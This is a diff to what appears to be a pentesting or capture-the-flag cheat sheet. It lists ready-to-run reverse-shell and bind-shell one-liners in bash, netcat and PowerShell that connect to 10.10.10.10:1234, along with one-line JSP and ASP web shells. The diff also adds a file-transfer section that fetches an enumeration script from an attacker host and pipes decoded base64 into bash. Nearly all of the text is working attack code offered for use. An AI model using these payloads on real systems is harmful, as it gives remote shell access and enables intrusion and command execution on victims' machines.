@@ -21,15 +21,16 @@
 
 Reverse shell, Bind Shell payloads
 
-```bash
-Reverse Shell
 
+Reverse Shell
+```bash
 bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
-
+```
+```bash
 Bind Shell
 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
@@ -59,3 +60,15 @@ JSP: <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ASP: <% eval request("cmd") %>
 
 ```
+
+Transferring files
+
+```bash
+python3 -m http.server
+wget http://10.10.14.1:8000/linenum.sh
+curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
+scp linenum.sh user@remotehost:/tmp/linenum.sh
+base64 shell -w 0 -> echo -n "<base_64_output> | base64 -d | bash
+```
+
+
